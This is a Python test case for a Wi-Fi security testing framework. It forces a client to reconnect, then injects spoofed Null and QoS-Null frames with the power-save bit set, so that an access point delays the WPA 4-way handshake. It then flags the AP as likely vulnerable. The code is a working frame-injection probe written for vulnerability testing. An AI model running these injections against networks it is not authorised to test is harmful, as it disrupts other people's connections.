# test_queue_4way_reconnect_strike.py
#
# Strategy:
# 1) Allow the supplicant to connect normally.
# 2) After a short pause, perform a client-side disconnect (wpa_cli disconnect) to force
#    a reconnection attempt. Optionally flush PMKSA just before disconnect to force a fresh 4-way.
# 3) When the client re-associates (AssocResp on-air, or Trigger.Associated), attempt immediate
#    injection(s) of Null / QoS-Null frames with pw-mgt (sleep) bit set to cause AP to mark client asleep.
# 4) Passively observe for AP->client EAPOL and client deauth. If client deauths and we did NOT
#    observe EAPOL on-air, mark AP as LIKELY VULNERABLE.
#
# Usage:
#   ./run_clean_test.sh <iface> queue-4way-reconnect-strike
#
# Notes:
#  - run_clean_test.sh is recommended so PMKSA is cleared before the *first* connection.
#  - This script will attempt a best-effort pmksa_flush just before forcing disconnect
#    (this helps ensure a fresh 4-way on reconnect). If it can't find the ctrl socket it will continue.
#  - Logging is verbose and prints STATUS/DEBUG messages to the framework logs.
#
from dependencies.libwifi.wifi import *
from library.testcase import Trigger, Action, Test
import subprocess
import threading
import time
import os


def _now_ts():
    return time.strftime("%H:%M:%S", time.localtime())


class Queue4WayReconnectStrike(Test):
    name = "queue-4way-reconnect-strike"
    kind = Test.Supplicant

    def __init__(self):
        # Use Associated if available (fires before EAPOL 1); fallback to Connected
        assoc_trigger = Trigger.Associated if hasattr(
            Trigger, "Associated") else Trigger.Connected

        # 3 inject actions triggered on association (reconnection)
        # 2 receive actions for EAPOL and Deauth (connected-phase listening)
        # 1 terminate action to finish after observation window
        super().__init__([
            Action(trigger=assoc_trigger, action=Action.Inject),
            Action(trigger=assoc_trigger, action=Action.Inject),
            Action(trigger=assoc_trigger, action=Action.Inject),

            Action(trigger=Trigger.Connected, action=Action.Receive),
            Action(trigger=Trigger.Connected, action=Action.Receive),

            Action(trigger=Trigger.Connected, action=Action.Terminate)
        ])

        # detection flags & counters
        self.eapol_seen = False
        self.client_deauth_seen = False
        self.ap_deauth_seen = False
        self.null_seen_count = 0
        self.reconnect_thread = None

        # parameters you can tune
        # seconds to wait after initial Connected before forcing disconnect
        self.wait_before_forced_disconnect = 1.5
        # seconds to wait after injection to observe behavior
        self.observation_window = 20.0
        # injection delays after association (seconds)
        self.inject_delays = [0.0, 0.005, 0.02]

    def _try_pmksa_flush(self, iface):
        """Best-effort flush PMKSA via wpa_cli on common ctrl dirs."""
        cand_dirs = ["/var/run/wpa_supplicant", "/run/wpa_supplicant",
                     "/tmp/wpa_supplicant", os.path.abspath(".")]
        for d in cand_dirs:
            try:
                cmd_show = ["wpa_cli", "-p", d, "-i", iface, "pmksa"]
                p = subprocess.run(
                    cmd_show, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=2)
                if p.returncode == 0:
                    # we can talk to this supplicant; flush it
                    cmd_flush = ["wpa_cli", "-p", d,
                                 "-i", iface, "pmksa_flush"]
                    pf = subprocess.run(
                        cmd_flush, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=2)
                    if pf.returncode == 0:
                        log(STATUS, "[%s] pmksa_flush succeeded via ctrl dir: %s" % (
                            _now_ts(), d), color="green")
                        return True
                    else:
                        log(STATUS, "[%s] pmksa_flush returned rc=%d via %s: %s %s" %
                            (_now_ts(), pf.returncode, d, pf.stdout.decode(errors="ignore"), pf.stderr.decode(errors="ignore")), color="yellow")
                        # continue trying other dirs
                # else not connectable here
            except FileNotFoundError:
                log(STATUS, "[%s] wpa_cli not found; skipping pmksa_flush attempts" % (
                    _now_ts()), color="yellow")
                return False
            except Exception as e:
                # ignore and try next dir
                log(DEBUG, "[%s] pmksa_flush attempt exception for %s: %s" % (
                    _now_ts(), d, str(e)), color="cyan")
                continue
        log(STATUS, "[%s] pmksa_flush: could not find an accessible wpa_supplicant ctrl socket (best-effort)" %
            (_now_ts()), color="yellow")
        return False

    def _force_disconnect_and_reconnect(self, station):
        """
        Run in background thread: wait a short period, optionally flush PMKSA,
        then issue wpa_cli disconnect (client-initiated). This forces the supplicant
        to reconnect and gives the test an opportunity to strike during the reconnection.
        """
        iface = getattr(station, "iface", "wlo1")
        log(STATUS, "[%s] Reconnect thread: will force disconnect on %s after %.3fs" %
            (_now_ts(), iface, self.wait_before_forced_disconnect), color="cyan")
        time.sleep(self.wait_before_forced_disconnect)

        # Attempt PMKSA flush before disconnect to force fresh 4-way on reconnect (best-effort).
        try:
            flushed = self._try_pmksa_flush(iface)
            if flushed:
                log(STATUS, "[%s] PMKSA flush attempted before forcing disconnect." % (
                    _now_ts()), color="green")
            else:
                log(STATUS, "[%s] PMKSA flush not successful or not available; continuing." % (
                    _now_ts()), color="yellow")
        except Exception as e:
            log(STATUS, "[%s] PMKSA flush exception: %s" %
                (_now_ts(), str(e)), color="yellow")

        # Now force a client-side disconnect via wpa_cli disconnect (best-effort)
        try:
            # try common ctrl dirs
            tried = False
            for d in ["/var/run/wpa_supplicant", "/run/wpa_supplicant", "/tmp/wpa_supplicant", os.path.abspath(".")]:
                try:
                    cmd = ["wpa_cli", "-p", d, "-i", iface, "disconnect"]
                    p = subprocess.run(
                        cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=2)
                    tried = True
                    if p.returncode == 0:
                        log(STATUS, "[%s] Issued wpa_cli disconnect via %s" % (
                            _now_ts(), d), color="cyan")
                        break
                    else:
                        log(DEBUG, "[%s] disconnect rc=%d via %s: %s %s" %
                            (_now_ts(), p.returncode, d, p.stdout.decode(errors="ignore"), p.stderr.decode(errors="ignore")), color="cyan")
                except FileNotFoundError:
                    log(STATUS, "[%s] wpa_cli not found; cannot programmatically disconnect" % (
                        _now_ts()), color="yellow")
                    tried = True
                    break
                except Exception:
                    # try next dir
                    continue

            if not tried:
                log(STATUS, "[%s] Could not find wpa_cli ctrl socket to disconnect; consider manual disconnect." % (
                    _now_ts()), color="yellow")
        except Exception as e:
            log(STATUS, "[%s] Exception while issuing disconnect: %s" % (
                _now_ts(), str(e)), color="yellow")

        # After disconnect, the supplicant will try to reconnect automatically. The injection logic
        # listens for Associated (or AssocResp) and will attempt to inject at the right moment.
        log(STATUS, "[%s] Reconnect thread: disconnect issued; waiting for reconnection events." % (
            _now_ts()), color="cyan")

    def receive(self, station, frame):
        """Passive receive handler used for detection and reactive injection upon AssocResp"""
        if not frame.haslayer(Dot11):
            return False

        addr1 = frame[Dot11].addr1
        addr2 = frame[Dot11].addr2

        # ignore unrelated frames
        if addr1 not in (station.mac, station.bss) and addr2 not in (station.mac, station.bss):
            return False

        # If we see an AssocResp or ReassocResp on-air, attempt immediate best-effort injection
        if frame.type == 0 and frame.subtype in (1, 3):
            if frame[Dot11].addr1 == station.mac and frame[Dot11].addr2 == station.bss:
                log(DEBUG, "[%s] AssocResp/ReassocResp observed on-air; attempting immediate injection" %
                    _now_ts(), color="cyan")
                try:
                    # attempt to set action[0] to immediate injection (best-effort)
                    null_frame = Dot11(
                        type="Data", subtype=4, addr1=station.bss, addr2=station.mac, addr3=station.bss)
                    null_frame.FCfield |= Dot11(FCfield="pw-mgt").FCfield
                    qos_null = Dot11(
                        type="Data", subtype=12, addr1=station.bss, addr2=station.mac, addr3=station.bss)
                    qos_null.FCfield |= Dot11(FCfield="pw-mgt").FCfield

                    # try immediate set on available inject action(s)
                    for i, frame_variant in enumerate([null_frame, qos_null, null_frame]):
                        try:
                            self.actions[i].set_frame(
                                frame_variant, mon=True, encrypt=False)
                            self.actions[i].set_delay(delay=0.0)
                            log(STATUS, "[%s] Reactive immediate inject scheduled (action=%d subtype=%d)" %
                                (_now_ts(), i, frame_variant.subtype), color="magenta")
                            break
                        except Exception as e:
                            log(DEBUG, "[%s] reactive inject schedule failed for action %d: %s" % (
                                _now_ts(), i, str(e)), color="cyan")
                except Exception as e:
                    log(STATUS, "[%s] Exception during reactive injection attempt: %s" % (
                        _now_ts(), str(e)), color="yellow")
                return True

        # AP->client EAPOL detection
        if frame.haslayer(EAPOL) and frame[Dot11].addr1 == station.mac and frame[Dot11].addr2 == station.bss:
            log(STATUS, "[%s] Observed AP->client EAPOL on-air: %s" %
                (_now_ts(), frame.summary()), color="green")
            self.eapol_seen = True
            return True

        # Deauthentication frames
        if frame.haslayer(Dot11Deauth):
            # client -> AP (client deauth)
            if frame[Dot11].addr2 == station.bss and frame[Dot11].addr1 == station.mac:
                log(STATUS, "[%s] Client->AP deauth observed: %s" %
                    (_now_ts(), frame.summary()), color="orange")
                self.client_deauth_seen = True
                if not self.eapol_seen:
                    log(STATUS, "[%s] HEURISTIC: client deauth WITHOUT observed AP->client EAPOL -> AP LIKELY VULNERABLE" %
                        _now_ts(), color="red")
                else:
                    log(STATUS, "[%s] client deauth observed but AP->client EAPOL was seen -> ambiguous" %
                        _now_ts(), color="yellow")
                return True

            # AP -> client deauth observed on-air
            if frame[Dot11].addr2 == station.mac and frame[Dot11].addr1 == station.bss:
                log(STATUS, "[%s] AP->client deauth observed on-air: %s" %
                    (_now_ts(), frame.summary()), color="blue")
                self.ap_deauth_seen = True
                return True

        # count observed null-data frames (optional)
        try:
            if frame.type == 2 and frame.subtype == 4:
                if frame[Dot11].addr1 == station.bss and frame[Dot11].addr2 == station.mac:
                    self.null_seen_count += 1
                    log(DEBUG, "[%s] Observed null-data on-air matching spoof (count=%d): %s" %
                        (_now_ts(), self.null_seen_count, frame.summary()), color="cyan")
        except Exception:
            pass

        return False

    def generate(self, station):
        """
        Called when the trigger fires for the initial connection (Connected / Associated).
        We schedule:
          - background thread to force disconnect after wait_before_forced_disconnect seconds
          - three quick inject actions triggered on Association (reconnect)
          - passive listeners and termination timer
        """
        iface = getattr(station, "iface", None) or "wlo1"
        log(STATUS, "[%s] generate(): starting test for station iface=%s bss=%s mac=%s" %
            (_now_ts(), iface, station.bss, station.mac), color="green")

        # Start background thread that will force a disconnect (and optionally flush PMKSA)
        t = threading.Thread(
            target=self._force_disconnect_and_reconnect, args=(station,), daemon=True)
        t.start()
        self.reconnect_thread = t
        log(STATUS, "[%s] Scheduled forced-disconnect thread to run in %.3fs" %
            (_now_ts(), self.wait_before_forced_disconnect), color="cyan")

        # Build frames used for scheduled injections (these will occur on the next Association)
        null_frame = Dot11(type="Data", subtype=4, addr1=station.bss,
                           addr2=station.mac, addr3=station.bss)
        null_frame.FCfield |= Dot11(FCfield="pw-mgt").FCfield
        qos_null = Dot11(type="Data", subtype=12, addr1=station.bss,
                         addr2=station.mac, addr3=station.bss)
        qos_null.FCfield |= Dot11(FCfield="pw-mgt").FCfield

        frames = [null_frame, qos_null, null_frame]
        for i, (f, d) in enumerate(zip(frames, self.inject_delays)):
            if i < 3:
                try:
                    self.actions[i].set_frame(f, mon=True, encrypt=False)
                    self.actions[i].set_delay(delay=d)
                    log(DEBUG, "[%s] Scheduled post-assoc inject #%d subtype=%d delay=%.3fs" %
                        (_now_ts(), i+1, f.subtype, d), color="cyan")
                except Exception as e:
                    log(STATUS, "[%s] Failed to schedule inject #%d: %s" % (
                        _now_ts(), i+1, str(e)), color="yellow")

        # Passive listeners for EAPOL and Deauth
        self.actions[3].set_receive(self.receive, mon=True)
        self.actions[4].set_receive(self.receive, mon=True)

        # Termination / observation window
        self.actions[5].set_delay(delay=self.observation_window)
        log(STATUS, "[%s] Test scheduled. Observation window %.1fs. Wait before forcing disconnect: %.3fs" %
            (_now_ts(), self.observation_window, self.wait_before_forced_disconnect), color="green")


### !!! Delay the handshake in the hostapd config to allow time injections to test vulnerabilty